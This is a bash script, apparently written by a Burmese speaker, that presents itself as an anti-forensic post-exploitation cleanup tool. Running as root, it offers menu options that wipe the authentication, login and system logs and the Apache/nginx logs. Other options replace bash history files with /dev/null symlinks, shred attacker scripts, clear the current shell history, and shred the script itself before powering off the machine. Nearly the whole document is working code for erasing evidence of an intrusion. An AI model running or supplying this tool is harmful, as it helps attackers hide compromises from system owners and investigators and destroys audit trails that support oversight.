#!/bin/bash
trap 'echo -e "\n\e[1;31mUSER INTERRUPTED! EXITING...\e[0m"; exit 1' SIGINT

# အရောင်သတ်မှတ်ချက်များ (ANSI Colors)
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
CYAN='\e[1;36m'
NC='\e[0m' # No Color (အရောင်ပြန်ဖျက်ရန်)

if (( $EUID != 0 )); then
    echo -e "${RED}YOU NEED TO RUN THIS SCRIPT AS ROOT!${NC}"
    exit 1
fi

LOG_FILES=(
    "/var/log/auth.log" "/var/log/syslog" "/var/log/messages"
    "/var/log/maillog" "/var/log/secure" "/var/log/wtmp"
    "/var/log/utmp" "/var/log/btmp" "/var/log/lastlog"
    "/var/log/apache2/access.log" "/var/log/apache2/error.log"
    "/var/log/httpd/access_log" "/var/log/httpd/error_log"
    "/var/log/nginx/access.log" "/var/log/nginx/error.log"
)

# ASCII Art Banner (clear မသုံးဘဲ စာသားသက်သက်ဖြင့် လှပအောင်လုပ်ခြင်း)
echo -e "${CYAN}"
echo "    _    _   _ _____ ___   _____ ___  ____  _____ _   _ ____ ___ ____ "
echo "   / \  | \ | |_   _|_ _| |  ___/ _ \|  _ \| ____| \ | / ___|_ _/ ___|"
echo "  / _ \ |  \| | | |  | |  | |_ | | | | |_) |  _| |  \| \___ \ | | |    "
echo " / ___ \| |\  | | |  | |  |  _|| |_| |  _ <| |___| |\  |___) || | |___ "
echo "/_/   \_\_| \_| |_| |___| |_|   \___/|_| \_\_____|_| \_|____/____\____|"
echo -e "                              [ Priv-Esc & Post-Exploit Cleanup Tool ]${NC}"

while true; do
    scripts_info=()
    bh_info=()

    echo -e "\n${YELLOW}=======================[ ANTI-FORENSIC OPTIONS ]=======================${NC}"
    echo -e "  ${CYAN}(1)${NC} CLEANUP WEB SERVER LOG"
    echo -e "  ${CYAN}(2)${NC} CLEANUP BASH HISTORY"
    echo -e "  ${CYAN}(3)${NC} CLEANUP CUSTOM SCRIPTS"
    echo -e "  ${CYAN}(4)${NC} CLEANUP CURRENT SHELL HISTORY"
    echo -e "  ${CYAN}(5)${NC} TERMINATE MACHINE (SELF-DESTRUCT)"
    echo -e "  ${CYAN}(6)${NC} EXIT"
    echo -e "${YELLOW}-----------------------------------------------------------------------${NC}"

    read -r -p "CHOOSE AN OPTION: " option
    echo "" # စာကြောင်းအလွတ်ခံခြင်း
    
    if [[ "$option" == "1" ]]; then
        echo -e "${BLUE}[*] CLEANING UP WEB SERVER LOGS...${NC}"
        for log in "${LOG_FILES[@]}"; do
            if [[ -f "$log" ]]; then
                : > "$log" 2>/dev/null  # 1-byte မကျန်စေရန် : > အသုံးပြုထားသည်
                echo -e "  ${GREEN}[+] Truncated:${NC} $log"
            fi
        done
        echo -e "${GREEN}[+] CLEANUP FINISHED!${NC}"
        continue
        
    elif [[ "$option" == "2" ]]; then
        while true; do
            read -r -p "TYPE YOUR BASH HISTORY FILE LOCATION (ENTER TO FINISH): " bh_location
            if [[ -z "$bh_location" ]]; then
                break
            fi
            bh_info+=("$bh_location")
        done
        
        if (( ${#bh_info[@]} > 0 )); then
            echo -e "${BLUE}[*] CLEANING UP BASH HISTORY FILES...${NC}"
            for bh in "${bh_info[@]}"; do
                if [[ -f "$bh" ]]; then
                    rm -f "$bh" && ln -sf /dev/null "$bh"
                    echo -e "  ${GREEN}[+] Symlinked to /dev/null:${NC} $bh"
                fi
            done
            echo -e "${GREEN}[+] CLEANUP FINISHED!${NC}"
        else
            echo -e "${RED}[!] NO PATH PROVIDED! SKIPPING...${NC}"
        fi
        continue
        
    elif [[ "$option" == "3" ]]; then
        while true; do
            read -r -p "TYPE YOUR SCRIPT LOCATION (ENTER TO FINISH): " script_location
            if [[ -z "$script_location" ]]; then
                break
            fi
            scripts_info+=("$script_location")
        done    
        
        if (( ${#scripts_info[@]} > 0 )); then
            echo -e "${BLUE}[*] SHREDDING CUSTOM SCRIPTS...${NC}"
            for script in "${scripts_info[@]}"; do
                if [[ -f "$script" ]]; then
                    shred -u -n 5 "$script"
                    echo -e "  ${GREEN}[+] Shredded (5-shots):${NC} $script"
                fi
            done
            echo -e "${GREEN}[+] CLEANUP FINISHED!${NC}"
        else
            echo -e "${RED}[!] NO PATH PROVIDED.. SKIPPING${NC}"
        fi
        continue
        
    elif [[ "$option" == "4" ]]; then
        echo -e "${BLUE}[*] CLEANING UP YOUR CURRENT SHELL HISTORY...${NC}"
        unset HISTFILE && history -c 2>/dev/null
        echo -e "${GREEN}[+] CLEANUP FINISHED!${NC}"
        continue
        
    elif [[ "$option" == "5" ]]; then
        echo -e "${RED}[!] TERMINATING MACHINE & SELF-DESTRUCTING...${NC}"
        shred -u -n 5 "$0" && systemctl poweroff && exit 0
        
    elif [[ "$option" == "6" ]]; then
        echo -e "${YELLOW}GOODBYE..${NC}"
        exit 0
    else
        echo -e "${RED}[!] INVALID OPTION!${NC}"
        sleep 1
        continue
    fi
done
